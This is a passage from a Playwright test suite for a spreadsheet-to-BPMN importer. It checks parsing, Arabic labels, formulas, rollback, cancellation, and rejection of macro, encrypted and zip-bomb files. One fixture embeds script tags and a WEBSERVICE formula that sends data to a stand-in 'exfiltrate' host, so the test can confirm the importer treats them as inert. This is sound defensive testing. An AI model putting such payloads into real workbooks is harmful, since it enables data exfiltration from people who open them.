          readonly syntheticBoundaries: readonly unknown[]
          readonly issues: readonly {
            readonly code: string
            readonly severity: string
            readonly processId?: string
          }[]
          readonly skippedRows: readonly unknown[]
          readonly artifacts: readonly {
            readonly destinationPath: string
            readonly checksumSha256: string
            readonly bytes: number
          }[]
        }
        expect(report.reportVersion).toBe(1)
        expect(report.planId).toMatch(/^import-[0-9a-f]{16}$/)
        expect(report.status).toBe('committed')
        expect(report.generatedIds).toEqual([
          {
            entity: 'node',
            processId: 'Process_matrix_missing_id',
            generatedId: 'Step_process_matrix_missing_id_review_r3_85fbb7e2',
            worksheet: 'Steps',
            row: 3
          }
        ])
        expect(report.inferredFlows.map(({ reason }) => reason).sort()).toEqual([
          'numeric-order',
          'numeric-order'
        ])
        expect(report.syntheticBoundaries).toEqual([])
        expect(report.issues).toContainEqual(
          expect.objectContaining({
            code: 'pipeline-di-di.process-missing',
            severity: 'warning',
            processId: 'Process_matrix_missing_id'
          })
        )
        expect(report.issues.every(({ severity }) => severity === 'warning')).toBe(true)
        expect(report.skippedRows).toEqual([])
        expect(report.artifacts).toHaveLength(1)
        expect(report.artifacts[0]!.destinationPath).toMatch(/\.bpmn$/)
        expect(report.artifacts[0]!.checksumSha256).toMatch(/^[0-9a-f]{64}$/)
        expect(report.artifacts[0]!.bytes).toBeGreaterThan(1_000)
      } else {
        const issue = await mandatorySpreadsheetIssue(panel, scenario.code)
        if ('worksheet' in scenario) await expect(issue).toContainText(scenario.worksheet)
        if ('cell' in scenario) await expect(issue).toContainText(scenario.cell)
        if ('raw' in scenario) await expect(issue).toContainText(scenario.raw)
        if ('secondaryCode' in scenario) {
          await mandatorySpreadsheetIssue(panel, scenario.secondaryCode)
        }
        await expect(panel.getByRole('button', { name: 'Prepare BPMN files' })).toHaveCount(0)
      }
      if (scenario.kind === 'unknown-type') {
        const issue = await mandatorySpreadsheetIssue(panel, 'unknown-step-type')
        await expect(issue).toHaveAttribute('data-severity', 'review')
        await expect(issue).toContainText('Raw value')
        await expect(issue).toContainText('Mystery work')
        await expect(issue).toContainText('Normalized value')
        await expect(issue).toContainText('mystery work')
        await expect(issue).toContainText('Repair guidance')
        await panel.getByLabel('Step type “Mystery work”').selectOption('userTask')
        await mandatorySpreadsheetReview(panel)
        await expect(panel.getByText('No workbook issues found.')).toBeVisible()
        await expect(panel.getByLabel('Step type “Mystery work”')).toHaveCount(0)
        await mandatorySpreadsheetPrepare(panel)
        await mandatorySpreadsheetCommit(panel)
        await page.getByRole('button', { name: 'Source', exact: true }).click()
        const sourceDialog = page.getByRole('dialog', { name: 'BPMN XML source' })
        const sourceXml = await sourceDialog.getByRole('textbox').inputValue()
        expect(sourceXml).toContain('<bpmn:userTask id="Task_matrix"')
        expect(sourceXml).not.toContain('Mystery work')
        await sourceDialog.getByRole('button', { name: 'Close', exact: true }).last().click()
        const [download] = await Promise.all([
          page.waitForEvent('download'),
          panel.getByRole('button', { name: 'Download import report' }).click()
        ])
        const report = JSON.parse(await mandatorySpreadsheetDownloadText(download)) as {
          readonly reportVersion: number
          readonly status: string
          readonly mapping: {
            readonly valueMappings: {
              readonly stepTypes: Readonly<Record<string, string>>
            }
          }
          readonly generatedIds: readonly unknown[]
          readonly inferredFlows: readonly unknown[]
          readonly syntheticBoundaries: readonly unknown[]
          readonly issues: readonly {
            readonly code: string
            readonly severity: string
            readonly processId?: string
          }[]
          readonly skippedRows: readonly unknown[]
          readonly artifacts: readonly unknown[]
        }
        expect(report).toMatchObject({
          reportVersion: 1,
          status: 'committed',
          generatedIds: [],
          inferredFlows: [],
          syntheticBoundaries: [],
          skippedRows: []
        })
        expect(report.issues).toContainEqual(
          expect.objectContaining({
            code: 'pipeline-di-di.process-missing',
            severity: 'warning',
            processId: 'Process_matrix_unknown_type'
          })
        )
        expect(report.issues.every(({ severity }) => severity === 'warning')).toBe(true)
        expect(report.mapping.valueMappings.stepTypes).toEqual({
          'mystery work': 'userTask'
        })
        expect(report.artifacts).toHaveLength(1)
      }
      if (index + 1 < cases.length) {
        await panel.getByRole('button', { name: 'Start over' }).click()
      }
    })
  }
})

test('mandatory spreadsheet X6: RFC-4180 quoted multiline Arabic CSV survives worker parsing, XML generation, and visible language projection', async ({
  page
}) => {
  const panel = await mandatorySpreadsheetBootSingleFile(page)
  const csv = `\uFEFF${[
    'Process ID,Step ID,Order,Type,Name EN,Name AR,Notes EN,Notes AR',
    'Process_csv,Start_csv,1,startEvent,Start,البداية,,',
    'Process_csv,Task_csv,2,userTask,Review request,مراجعة الطلب,"Review request',
    'including ""priority"" attachments","مراجعة الطلب',
    'بما في ذلك ""المرفقات"""',
    'Process_csv,End_csv,3,endEvent,End,النهاية,,'
  ].join('\r\n')}`
  await mandatorySpreadsheetUpload(
    panel,
    {
      name: 'mandatory-multiline-arabic.csv',
      mimeType: 'text/csv',
      buffer: Buffer.from(csv, 'utf8')
    },
    'ordinary'
  )
  await panel.getByLabel('Default process ID').fill('Process_csv')
  await panel.getByLabel('Default process name (English)').fill('CSV review')
  await panel.getByLabel('Default process name (Arabic)').fill('مراجعة الجدول')
  await mandatorySpreadsheetReview(panel)
  await expect(panel.getByText('No workbook issues found.')).toBeVisible()
  await mandatorySpreadsheetPrepare(panel)
  await mandatorySpreadsheetCommit(panel)
  await expect(page.locator('.djs-element[data-element-id="Task_csv"]')).toBeVisible({
    timeout: 30_000
  })
  await page.getByRole('button', { name: 'Source', exact: true }).click()
  const sourceDialog = page.getByRole('dialog', { name: 'BPMN XML source' })
  const sourceXml = await sourceDialog.getByRole('textbox').inputValue()
  expect(sourceXml).toContain('Review request&#10;including &#34;priority&#34; attachments')
  expect(sourceXml).toContain('مراجعة الطلب&#10;بما في ذلك &#34;المرفقات&#34;')
  await sourceDialog.getByRole('button', { name: 'Close', exact: true }).last().click()
  await page.getByRole('button', { name: /EN⇄AR/ }).click()
  // The switch audits workspace localization and projects Arabic labels
  // asynchronously; give the projection the same bound this file uses for its
  // other worker-backed renders.
  await expect(
    page.locator('.djs-element[data-element-id="Task_csv"] .djs-label', {
      hasText: 'مراجعة الطلب'
    })
  ).toBeVisible({ timeout: 20_000 })
})

test('mandatory spreadsheet X7: formula cells with and without cached displayed values are distinguished in the browser', async ({
  page
}) => {
  const networkRequests: string[] = []
  page.on('request', (request) => {
    if (/^https?:/i.test(request.url())) networkRequests.push(request.url())
  })
  const formulas = ['cached', 'missing-cache'] as const
  const panel = await mandatorySpreadsheetBootSingleFile(page)
  for (const [index, formula] of formulas.entries()) {
    await test.step(formula, async () => {
      await mandatorySpreadsheetUpload(panel, {
        name: `mandatory-formula-${formula}.xlsx`,
        mimeType: MANDATORY_SPREADSHEET_XLSX_MIME,
        buffer: Buffer.from(
          mandatorySpreadsheetSimpleWorkbook('bilingual', {
            orderFormula: formula
          })
        )
      })
      await mandatorySpreadsheetReview(panel)
      const issue = await mandatorySpreadsheetIssue(
        panel,
        formula === 'cached' ? 'cached-formula-value' : 'formula-without-cache'
      )
      await expect(issue).toContainText('Steps')
      await expect(issue).toContainText('C3')
      if (formula === 'cached') {
        await expect(issue).toHaveAttribute('data-severity', 'warning')
        await expect(issue).toContainText('Raw value')
        await expect(issue).toContainText('37')
        await expect(issue).toContainText('Normalized value')
        await expect(issue).toContainText('Repair guidance')
        await mandatorySpreadsheetPrepare(panel)
        await mandatorySpreadsheetCommit(panel)
        await page.getByRole('button', { name: 'Source', exact: true }).click()
        const sourceDialog = page.getByRole('dialog', { name: 'BPMN XML source' })
        const sourceXml = await sourceDialog.getByRole('textbox').inputValue()
        expect(sourceXml).toContain('id="Task_simple"')
        expect(sourceXml).not.toContain('WEBSERVICE')
        expect(sourceXml).not.toContain('formula.invalid')
        await sourceDialog.getByRole('button', { name: 'Close', exact: true }).last().click()
        const [download] = await Promise.all([
          page.waitForEvent('download'),
          panel.getByRole('button', { name: 'Download import report' }).click()
        ])
        const report = JSON.parse(await mandatorySpreadsheetDownloadText(download)) as {
          readonly reportVersion: number
          readonly status: string
          readonly issues: readonly {
            readonly code: string
            readonly severity: string
            readonly worksheet: string
            readonly cellAddress: string
            readonly rawValue: unknown
            readonly normalizedValue: unknown
          }[]
          readonly artifacts: readonly unknown[]
        }
        expect(report.reportVersion).toBe(1)
        expect(report.status).toBe('committed')
        expect(report.issues).toContainEqual(
          expect.objectContaining({
            code: 'cached-formula-value',
            severity: 'warning',
            worksheet: 'Steps',
            cellAddress: 'C3',
            rawValue: 37,
            normalizedValue: 37
          })
        )
        expect(report.artifacts).toHaveLength(1)
      } else {
        await expect(issue).toHaveAttribute('data-severity', 'error')
        await expect(issue).toContainText('Repair guidance')
        await expect(panel.getByRole('button', { name: 'Prepare BPMN files' })).toHaveCount(0)
      }
      if (index + 1 < formulas.length) {
        await panel.getByRole('button', { name: 'Start over' }).click()
      }
    })
  }
  expect(networkRequests).toEqual([])
})

test('mandatory spreadsheet X7/X8: external links and data connections are inert, ignored, and reported without network or script execution', async ({
  page
}) => {
  await page.addInitScript(() => {
    ;(
      window as unknown as {
        __MANDATORY_SPREADSHEET_EXTERNAL_EXECUTED__: boolean
      }
    ).__MANDATORY_SPREADSHEET_EXTERNAL_EXECUTED__ = false
  })
  const networkRequests: string[] = []
  page.on('request', (request) => {
    if (/^https?:/i.test(request.url())) networkRequests.push(request.url())
  })
  const externalPayload =
    '<externalLink><script>window.__MANDATORY_SPREADSHEET_EXTERNAL_EXECUTED__=true</script>' +
    '<formula>WEBSERVICE("https://external.invalid/exfiltrate")</formula></externalLink>'
  const connectionsPayload =
    '<connections><connection name="danger"><script>window.__MANDATORY_SPREADSHEET_EXTERNAL_EXECUTED__=true</script>' +
    '<url>https://connections.invalid/exfiltrate</url></connection></connections>'
  const workbook = mandatorySpreadsheetOfficialWorkbook(
    {
      processes: [
        {
          process_id: 'Process_external',
          name_en: 'Inert external content',
          name_ar: 'محتوى خارجي خامل',
          active_language: 'en'
        }
      ],
      steps: [
        {
          process_id: 'Process_external',
          step_id: 'Start_external',
          order: 1,
          type: 'startEvent',
          name_en: 'Start',
          name_ar: 'البداية'
        },
        {
          process_id: 'Process_external',
          step_id: 'End_external',
          order: 2,
          type: 'endEvent',
          name_en: 'End',
          name_ar: 'النهاية'
        }
      ],
      flows: [
        {
          process_id: 'Process_external',
          flow_id: 'Flow_external',
          source_step_id: 'Start_external',
          target_step_id: 'End_external',
          is_default: false
        }
      ]
    },
    {
      extraEntries: {
        'xl/externalLinks/externalLink1.xml': externalPayload,
        'xl/connections.xml': connectionsPayload,
        'xl/queryTables/queryTable1.xml': connectionsPayload
      }
    }
  )
  const panel = await mandatorySpreadsheetBootSingleFile(page)
  await mandatorySpreadsheetUpload(panel, {
    name: 'mandatory-inert-external-content.xlsx',
    mimeType: MANDATORY_SPREADSHEET_XLSX_MIME,
    buffer: Buffer.from(workbook)
  })
  await mandatorySpreadsheetReview(panel)
  const externalLinkIssue = await mandatorySpreadsheetIssue(panel, 'external-links-ignored')
  const dataConnectionIssue = await mandatorySpreadsheetIssue(panel, 'data-connections-ignored')
  await expect(externalLinkIssue).toHaveAttribute('data-severity', 'warning')
  await expect(dataConnectionIssue).toHaveAttribute('data-severity', 'warning')
  await mandatorySpreadsheetPrepare(panel)
  await mandatorySpreadsheetCommit(panel)
  await page.getByRole('button', { name: 'Source', exact: true }).click()
  const sourceDialog = page.getByRole('dialog', { name: 'BPMN XML source' })
  const sourceXml = await sourceDialog.getByRole('textbox').inputValue()
  expect(sourceXml).not.toContain('external.invalid')
  expect(sourceXml).not.toContain('connections.invalid')
  expect(sourceXml).not.toContain('<script>')
  await sourceDialog.getByRole('button', { name: 'Close', exact: true }).last().click()
  expect(
    await page.evaluate(
      () =>
        (
          window as unknown as {
            __MANDATORY_SPREADSHEET_EXTERNAL_EXECUTED__: boolean
          }
        ).__MANDATORY_SPREADSHEET_EXTERNAL_EXECUTED__
    )
  ).toBe(false)
  expect(networkRequests).toEqual([])
  const [download] = await Promise.all([
    page.waitForEvent('download'),
    panel.getByRole('button', { name: 'Download import report' }).click()
  ])
  const report = JSON.parse(await mandatorySpreadsheetDownloadText(download)) as {
    readonly status: string
    readonly issues: readonly {
      readonly code: string
      readonly severity: string
      readonly details?: Readonly<Record<string, unknown>>
    }[]
  }
  expect(report.status).toBe('committed')
  expect(report.issues).toEqual(
    expect.arrayContaining([
      expect.objectContaining({ code: 'external-links-ignored', severity: 'warning' }),
      expect.objectContaining({ code: 'data-connections-ignored', severity: 'warning' })
    ])
  )
})

test('mandatory spreadsheet X8: oversize, encrypted, macro-enabled, embedded-macro, malformed, and decompression-bomb files are rejected before mapping', async ({
  page
}) => {
  const official = mandatorySpreadsheetOfficialWorkbook({})
  const cases = [
    {
      name: 'oversize.xlsx',
      bytes: new Uint8Array(MANDATORY_SPREADSHEET_INPUT_LIMIT + 1),
      code: 'compressed-size-limit'
    },
    {
      name: 'encrypted.xlsx',
      bytes: new Uint8Array([
        0xd0,
        0xcf,
        0x11,
        0xe0,
        0xa1,
        0xb1,
        0x1a,
        0xe1,
        ...new Uint8Array(64)
      ]),
      code: 'encrypted-workbook'
    },
    {
      name: 'macro-enabled.xlsm',
      bytes: official,
      code: 'macro-enabled-format'
    },
    {
      name: 'embedded-macro.xlsx',
      bytes: mandatorySpreadsheetReplaceAscii(official, 'docProps/app.xml', 'xl/activeX/a.xml'),
      code: 'macro-content'
    },
    {
      name: 'malformed.xlsx',
      bytes: strToU8('not an OPC ZIP package'),
      code: 'malformed-zip'
    },
    {
      name: 'bomb.xlsx',
      bytes: mandatorySpreadsheetBombWorkbook(),
      code: 'uncompressed-size-limit'
    }
  ] as const
  const panel = await mandatorySpreadsheetBootSingleFile(page)
  for (const [index, scenario] of cases.entries()) {
    await test.step(scenario.name, async () => {
      await mandatorySpreadsheetUpload(
        panel,
        {
          name: scenario.name,
          mimeType: MANDATORY_SPREADSHEET_XLSX_MIME,
          buffer: Buffer.from(scenario.bytes)
        },
        'none'
      )
      await expect(panel.getByRole('alert')).toContainText(scenario.code, { timeout: 30_000 })
      await expect(panel.getByText(/Official OrbitPM template detected/i)).toHaveCount(0)
      await expect(panel.getByText(/Ordinary spreadsheet detected/i)).toHaveCount(0)
      if (index + 1 < cases.length) {
        await panel.getByRole('button', { name: 'Start over' }).click()
      }
    })
  }
})

test('mandatory spreadsheet X9: cancellation aborts the real worker operation without stale completion', async ({
  page
}) => {
  await page.addInitScript(() => {
    const nativeAdd = Worker.prototype.addEventListener
    const nativeRemove = Worker.prototype.removeEventListener
    const nativePost = Worker.prototype.postMessage
    const nativeTerminate = Worker.prototype.terminate
    const spreadsheetWorkers = new WeakSet<Worker>()
    const wrappedListeners = new WeakMap<object, EventListener>()
    const state = {
      parsePosted: 0,
      cancelPosted: 0,
      heldResponses: 0,
      detachedMessageListeners: 0,
      terminated: 0,
      parseRequestId: '',
      cancelRequestId: '',
      events: [] as string[]
    }
    Worker.prototype.postMessage = function (
      message: unknown,
      transferOrOptions?: Transferable[] | StructuredSerializeOptions
    ): void {
      const envelope =
        message && typeof message === 'object'
          ? (message as { readonly type?: unknown; readonly requestId?: unknown })
          : undefined
      if (envelope?.type === 'parse') {
        spreadsheetWorkers.add(this)
        state.parsePosted += 1
        state.parseRequestId =
          typeof envelope.requestId === 'string' ? envelope.requestId : '<missing>'
        state.events.push('parse')
      } else if (envelope?.type === 'cancel' && spreadsheetWorkers.has(this)) {
        state.cancelPosted += 1
        state.cancelRequestId =
          typeof envelope.requestId === 'string' ? envelope.requestId : '<missing>'
        state.events.push('cancel')
      }
      ;(
        nativePost as (
          this: Worker,
          value: unknown,
          transfer?: Transferable[] | StructuredSerializeOptions
        ) => void
      ).call(this, message, transferOrOptions)
    }
    Worker.prototype.addEventListener = function (
      type: string,
      listener: EventListenerOrEventListenerObject | null,
      options?: boolean | AddEventListenerOptions
    ): void {
      if (listener === null) return
      if (type !== 'message') {
        nativeAdd.call(this, type, listener, options)
        return
      }
      const wrapped: EventListener = (event) => {
        if (spreadsheetWorkers.has(this)) {
          state.heldResponses += 1
          return
        }
        if (typeof listener === 'function') listener.call(this, event)
        else listener.handleEvent(event)
      }
      wrappedListeners.set(listener as object, wrapped)
      nativeAdd.call(this, type, wrapped, options)
    }
    Worker.prototype.removeEventListener = function (
      type: string,
      listener: EventListenerOrEventListenerObject | null,
      options?: boolean | EventListenerOptions
    ): void {
      if (listener === null) return
      const wrapped = wrappedListeners.get(listener as object)
      nativeRemove.call(this, type, wrapped ?? listener, options)
      if (type === 'message' && spreadsheetWorkers.has(this)) {
        state.detachedMessageListeners += 1
      }
    }
    Worker.prototype.terminate = function (): void {
      if (spreadsheetWorkers.has(this)) {
        state.terminated += 1
        state.events.push('terminate')
      }
      nativeTerminate.call(this)
    }
    ;(
      window as unknown as {
        __MANDATORY_SPREADSHEET_WORKER_STATE__: () => typeof state
      }
    ).__MANDATORY_SPREADSHEET_WORKER_STATE__ = () => ({
      ...state,
      events: [...state.events]
    })
  })
  const panel = await mandatorySpreadsheetBootSingleFile(page)
  const rows = ['Process ID,Step ID,Order,Type,Name EN,Name AR']
  for (let index = 1; index <= 4_000; index += 1) {
    rows.push(`Process_cancel,Task_cancel_${index},${index},task,Task ${index},المهمة ${index}`)
  }
  const upload = panel.locator('input[type="file"][accept*=".xlsx"]').setInputFiles({
    name: 'mandatory-cancel.csv',
    mimeType: 'text/csv',
    buffer: Buffer.from(rows.join('\r\n'), 'utf8')
  })
  await expect
    .poll(
      async () =>
        await page.evaluate(
          () =>
            (
              window as unknown as {
                __MANDATORY_SPREADSHEET_WORKER_STATE__: () => {
                  readonly parsePosted: number
                }
              }
            ).__MANDATORY_SPREADSHEET_WORKER_STATE__().parsePosted
        )
    )
    .toBe(1)
  await expect
    .poll(
      async () =>
        await page.evaluate(
          () =>
            (
              window as unknown as {
                __MANDATORY_SPREADSHEET_WORKER_STATE__: () => {
                  readonly heldResponses: number
                }
              }
            ).__MANDATORY_SPREADSHEET_WORKER_STATE__().heldResponses
        )
    )
    .toBeGreaterThan(0)
  await expect(panel.getByRole('button', { name: 'Cancel' })).toBeVisible({ timeout: 10_000 })
  await panel.getByRole('button', { name: 'Cancel' }).click()
  await upload
  await expect(panel.getByText('Operation cancelled.')).toBeVisible({ timeout: 20_000 })
  await expect(panel.getByText(/Ordinary spreadsheet detected/i)).toHaveCount(0)
  const workerState = await page.evaluate(() =>
    (
      window as unknown as {
        __MANDATORY_SPREADSHEET_WORKER_STATE__: () => {
          readonly parsePosted: number
          readonly cancelPosted: number
          readonly heldResponses: number
          readonly detachedMessageListeners: number
          readonly terminated: number
          readonly parseRequestId: string
          readonly cancelRequestId: string
          readonly events: readonly string[]
        }
      }
    ).__MANDATORY_SPREADSHEET_WORKER_STATE__()
  )
  expect(workerState).toMatchObject({
    parsePosted: 1,
    cancelPosted: 1,
    detachedMessageListeners: 1,
    terminated: 1,
    events: ['parse', 'cancel', 'terminate']
  })
  expect(workerState.heldResponses).toBeGreaterThan(0)
  expect(workerState.cancelRequestId).toBe(workerState.parseRequestId)
  await expect(panel.getByText(/Ordinary spreadsheet detected/i)).toHaveCount(0)
  await expect(panel.getByText(/Official OrbitPM template detected/i)).toHaveCount(0)
})

test('mandatory spreadsheet X9: collision policy blocks before writes and preserves the destination bytes', async ({
  page
}) => {
  const original =
    '<?xml version="1.0"?><definitions id="mandatory-original">unchanged collision bytes</definitions>'
  await mandatorySpreadsheetInstallWorkspace(page, {
    seed: { 'Examples/simple-approval.bpmn': original }
  })
  await mandatorySpreadsheetOpenDirectory(page)
  const treeBefore = await mandatorySpreadsheetWorkspaceTree(page)
  const writesBefore = await mandatorySpreadsheetWorkspaceWrites(page)
  const panel = await mandatorySpreadsheetOpenPanel(page)
  await mandatorySpreadsheetUpload(panel, {
    name: 'mandatory-collision.xlsx',
    mimeType: MANDATORY_SPREADSHEET_XLSX_MIME,
    buffer: Buffer.from(mandatorySpreadsheetSimpleWorkbook('bilingual'))
  })
  await panel.getByLabel('If a file already exists').selectOption('error')
  await mandatorySpreadsheetReview(panel)
  await panel.getByRole('button', { name: 'Prepare BPMN files' }).click()
  const issue = await mandatorySpreadsheetIssue(panel, 'destination-path-collision')
  await expect(issue).toContainText('Examples/simple-approval.bpmn')
  await expect(panel.getByRole('button', { name: 'Commit import' })).toHaveCount(0)
  expect(await mandatorySpreadsheetWorkspaceWriteAttempts(page)).toEqual([])
  expect(await mandatorySpreadsheetWorkspaceWrites(page)).toEqual(writesBefore)
  expect(await mandatorySpreadsheetWorkspaceText(page, 'Examples/simple-approval.bpmn')).toBe(
    original
  )
  expect(
    (await mandatorySpreadsheetWorkspacePaths(page)).filter((path) => path.endsWith('.bpmn'))
  ).toEqual(['Examples/simple-approval.bpmn'])
  expect(await mandatorySpreadsheetWorkspaceTree(page)).toEqual(treeBefore)
})

test('mandatory spreadsheet X9: a second-artifact write failure rolls back the first artifact and produces a truthful report', async ({
  page
}) => {
  const originalLinker =
    '<?xml version="1.0"?><definitions id="mandatory-linker-original">exact pre-import linker bytes</definitions>'
  await mandatorySpreadsheetInstallWorkspace(page, {
    seed: {
      'Ops/Existing/existing-review.bpmn': MANDATORY_SPREADSHEET_EXISTING_LINK_TARGET,
      'Ops/Links/linked-review.bpmn': originalLinker,
      'Ops/Intake/.keep': 'pre-existing non-BPMN intake marker',
      'Ops/Shared/.keep': 'pre-existing non-BPMN shared marker'
    },
    // #1 is the overwrite recovery BPMN, #2 is the first artifact, and #3
    // fails while writing the second artifact.
    failBpmnWriteAt: 3
  })
  await mandatorySpreadsheetOpenDirectory(page)
  const treeBefore = await mandatorySpreadsheetWorkspaceTree(page)
  const pathsBefore = await mandatorySpreadsheetWorkspacePaths(page)
  const panel = await mandatorySpreadsheetOpenPanel(page)
  await mandatorySpreadsheetUpload(panel, {
    name: 'mandatory-rollback.xlsx',
    mimeType: MANDATORY_SPREADSHEET_XLSX_MIME,
    buffer: Buffer.from(mandatorySpreadsheetComplexWorkbook())
  })
  await panel.getByLabel('If a file already exists').selectOption('overwrite')
  await mandatorySpreadsheetReview(panel)
  await mandatorySpreadsheetPrepare(panel)
  await panel.getByRole('button', { name: 'Commit import' }).click()
  await expect(panel.getByText('Import failed; destination changes were rolled back.')).toBeVisible(
    { timeout: 45_000 }
  )
  const attempts = await mandatorySpreadsheetWorkspaceWriteAttempts(page)
  expect(attempts.some((path) => /^\.orbitpm\/history\/.+\.bpmn$/.test(path))).toBe(true)
  expect(attempts).toEqual(
    expect.arrayContaining(['Ops/Links/linked-review.bpmn', 'Ops/Intake/main-approval.bpmn'])
  )
  expect(attempts.filter((path) => path === 'Ops/Links/linked-review.bpmn')).toHaveLength(2)
  expect(await mandatorySpreadsheetWorkspaceText(page, 'Ops/Links/linked-review.bpmn')).toBe(
    originalLinker
  )
  expect(await mandatorySpreadsheetWorkspaceText(page, 'Ops/Intake/.keep')).toBe(
    'pre-existing non-BPMN intake marker'
  )
  expect(await mandatorySpreadsheetWorkspaceText(page, 'Ops/Shared/.keep')).toBe(
    'pre-existing non-BPMN shared marker'
  )
  expect(await mandatorySpreadsheetWorkspacePaths(page)).toEqual(pathsBefore)
  expect(await mandatorySpreadsheetWorkspaceTree(page)).toEqual(treeBefore)
  const [download] = await Promise.all([
    page.waitForEvent('download'),
    panel.getByRole('button', { name: 'Download import report' }).click()
  ])
  const report = JSON.parse(await mandatorySpreadsheetDownloadText(download)) as {
    readonly reportVersion: number
    readonly planId: string
    readonly sourceFile: string
    readonly startedAt: string
    readonly completedAt: string
    readonly status: string
    readonly failure?: { readonly code?: string; readonly stage?: string }
    readonly generatedIds: readonly unknown[]
    readonly inferredFlows: readonly unknown[]
    readonly syntheticBoundaries: readonly unknown[]
    readonly issues: readonly {
      readonly code: string
      readonly severity: string
      readonly processId?: string
      readonly details?: Readonly<Record<string, unknown>>
    }[]
    readonly skippedRows: readonly unknown[]
    readonly artifacts: readonly {
      readonly processId: string
      readonly destinationPath: string
      readonly checksumSha256: string
      readonly bytes: number
      readonly translation: Readonly<Record<string, unknown>>
    }[]
  }
  expect(report.reportVersion).toBe(1)
  expect(report.planId).toMatch(/^import-[0-9a-f]{16}$/)
  expect(report.sourceFile).toBe('mandatory-rollback.xlsx')
  expect(Date.parse(report.startedAt)).not.toBeNaN()
  expect(Date.parse(report.completedAt)).toBeGreaterThanOrEqual(Date.parse(report.startedAt))
  expect(report.status).toBe('rolled-back')
  expect(report.failure?.code).toBe('transaction-failed')
  expect(report.failure?.stage).toBe('commit')
  expect(report.generatedIds).toEqual([])
  expect(report.inferredFlows).toEqual([])
  expect(report.syntheticBoundaries).toEqual([])
  expect(report.issues.map(({ code, processId }) => `${code}:${processId ?? ''}`).sort()).toEqual([
    'pipeline-di-di.process-missing:Process_child',
    'pipeline-di-di.process-missing:Process_linker',
    'pipeline-di-di.process-missing:Process_main',
    'pipeline-lint-bpmnlint.fake-join:Process_main'
  ])
  expect(report.issues.every(({ severity }) => severity === 'warning')).toBe(true)
  expect(report.skippedRows).toEqual([])
  expect(report.artifacts).toHaveLength(3)
  expect(report.artifacts.map(({ processId }) => processId).sort()).toEqual([
    'Process_child',
    'Process_linker',
    'Process_main'
  ])
  for (const artifact of report.artifacts) {
    expect(artifact.destinationPath).toMatch(/\.bpmn$/)
    expect(artifact.checksumSha256).toMatch(/^[0-9a-f]{64}$/)
    expect(artifact.bytes).toBeGreaterThan(1_000)
    expect(artifact.translation).toEqual({
      complete: true,
      missing: 0,
      invalid: 0,
      translationRequired: false
    })
  }
})

test('mandatory spreadsheet X9: exported mapping presets are reusable only against the matching ordinary workbook headers', async ({
  page
}) => {
  const panel = await mandatorySpreadsheetBootSingleFile(page)
  const headers = [
    'Case Ref',
    'Node Ref',
    'Sort Rank',
    'Work Class',
    'Title English',
    'Title Arabic',
    'Input Items'
  ]
  const csv = [
    headers.join(','),
    'Process_sensitive_alpha,Start_sensitive,1,startEvent,Secret Customer Alpha,عميل سري للغاية,credential-one|credential-two',
    'Process_sensitive_alpha,Task_sensitive,2,userTask,Internal approval,اعتماد داخلي,private-token|classified-record',
    'Process_sensitive_alpha,End_sensitive,3,endEvent,Closed confidentially,إغلاق سري,'
  ].join('\r\n')
  await mandatorySpreadsheetUpload(
    panel,
    {
      name: 'mandatory-preset-source.csv',
      mimeType: 'text/csv',
      buffer: Buffer.from(csv, 'utf8')
    },
    'ordinary'
  )
  const steps = panel
    .locator('details')
    .filter({ hasText: 'Steps, IDs, order, type, bilingual details' })
  const mappingField = (field: string): Locator =>
    steps
      .locator('code')
      .filter({ hasText: new RegExp(`^${field}$`) })
      .locator('xpath=ancestor::label[1]')
  await mappingField('process_id').getByRole('combobox').selectOption('Case Ref')
  await mappingField('step_id').getByRole('combobox').selectOption('Node Ref')
  await mappingField('order').getByRole('combobox').selectOption('Sort Rank')
  await mappingField('type').getByRole('combobox').selectOption('Work Class')
  await mappingField('name_en').getByRole('combobox').selectOption('Title English')
  await mappingField('name_ar').getByRole('combobox').selectOption('Title Arabic')
  await mappingField('inputs_en').getByRole('combobox').selectOption('Input Items')
  await panel.getByLabel('List delimiters').fill('|')
  await panel.getByLabel('Flow inference').selectOption('numeric-order')
  const [presetDownload] = await Promise.all([
    page.waitForEvent('download'),
    panel.getByRole('button', { name: 'Export preset' }).click()
  ])
  const presetText = await mandatorySpreadsheetDownloadText(presetDownload)
  const preset = JSON.parse(presetText) as {
    readonly version: number
    readonly selectedSheets: {
      readonly steps: { readonly worksheet: string; readonly headerRow: number }
    }
    readonly fieldMappings: {
      readonly steps: Readonly<Record<string, string>>
    }
    readonly delimiters: { readonly list: readonly string[] }
    readonly inference: { readonly flowMode: string }
  }
  expect(preset.version).toBe(2)
  expect(preset.selectedSheets.steps).toEqual({ worksheet: 'CSV', headerRow: 1 })
  expect(preset.fieldMappings.steps).toMatchObject({
    process_id: 'Case Ref',
    step_id: 'Node Ref',
    order: 'Sort Rank',
    type: 'Work Class',
    name_en: 'Title English',
    name_ar: 'Title Arabic',
    inputs_en: 'Input Items'
  })
  expect(preset.delimiters.list).toEqual(['|'])
  expect(preset.inference.flowMode).toBe('numeric-order')
  const forbiddenKeys: string[] = []
  const inspectKeys = (value: unknown): void => {
    if (!value || typeof value !== 'object') return
    if (Array.isArray(value)) {
      for (const entry of value) inspectKeys(entry)
      return
    }
    for (const [key, entry] of Object.entries(value)) {
      if (
        /^(?:credentials?|password|secret|api.?key|tokens?|rows?|cells?|workbook.?data)$/i.test(key)
      ) {
        forbiddenKeys.push(key)
      }
      inspectKeys(entry)
    }
  }
  inspectKeys(preset)
  expect(forbiddenKeys).toEqual([])
  for (const sensitiveValue of [
    'Process_sensitive_alpha',
    'Start_sensitive',
    'Task_sensitive',
    'End_sensitive',
    'Secret Customer Alpha',
    'عميل سري للغاية',
    'credential-one',
    'private-token',
    'classified-record'
  ]) {
    expect(presetText).not.toContain(sensitiveValue)
  }

  await panel.getByRole('button', { name: 'Start over' }).click()
  const reuseCsv = csv
    .replaceAll('Process_sensitive_alpha', 'Process_reused_values')
    .replace('Secret Customer Alpha', 'Fresh workbook value')
    .replace('عميل سري للغاية', 'قيمة مصنف جديدة')
  await mandatorySpreadsheetUpload(
    panel,
    {
      name: 'mandatory-preset-reuse.csv',
      mimeType: 'text/csv',
      buffer: Buffer.from(reuseCsv, 'utf8')
    },
    'ordinary'
  )
  const reuseSteps = panel
    .locator('details')
    .filter({ hasText: 'Steps, IDs, order, type, bilingual details' })
  const reuseField = (field: string): Locator =>
    reuseSteps
      .locator('code')
      .filter({ hasText: new RegExp(`^${field}$`) })
      .locator('xpath=ancestor::label[1]')
  await reuseField('step_id').getByRole('combobox').selectOption('Sort Rank')
  await expect(reuseField('step_id').getByRole('combobox')).toHaveValue('Sort Rank')
